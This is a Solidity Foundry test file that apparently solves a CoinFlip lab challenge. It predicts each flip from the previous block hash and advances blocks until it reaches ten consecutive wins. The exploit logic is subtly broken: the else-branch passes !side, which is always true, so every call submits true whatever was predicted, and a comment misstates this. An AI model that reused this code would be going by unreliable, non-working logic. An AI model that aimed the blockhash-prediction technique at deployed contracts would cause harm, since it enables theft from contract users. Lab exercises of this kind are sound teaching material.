// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract CoinFLipTest is Test {
    CoinFlip cf;

    function setUp() public {
        cf = new CoinFlip();
    }

    function testFlip() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue;
        uint256 coinFlip;
        bool side;
        for (uint256 i = 0; i < 10; i++) {
            blockValue = uint256(blockhash(block.number - 1));
            coinFlip = blockValue / FACTOR;
            side = coinFlip == 1 ? true : false;
            if (side) {
                cf.flip(side); //side == true
            } else {
                cf.flip(!side); // side == false
            }
            if (cf.consecutiveWins() == 10) {
                console.log("you win ");
                return;
            }
            vm.warp(block.timestamp + 1);
            vm.roll(block.number + 1);
        }
    }
}
